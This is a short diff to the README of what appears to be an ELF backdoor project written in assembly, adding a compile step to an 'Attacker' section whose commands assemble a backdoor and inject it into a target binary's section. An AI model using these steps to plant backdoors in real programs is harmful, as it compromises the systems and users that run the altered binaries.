@@ -5,6 +5,7 @@ It is an elf backdoor written in pure assembly language.
 ## Attacker
 ### backdoor
 ```bash
+$ gcc elfinject.c -o elfinject -lelf
 $ nasm -f bin backdoor.s -o backdoor.bin
 $ ./elfinject elftarget backdoor.bin ".injected" 0x800000 0
 ```
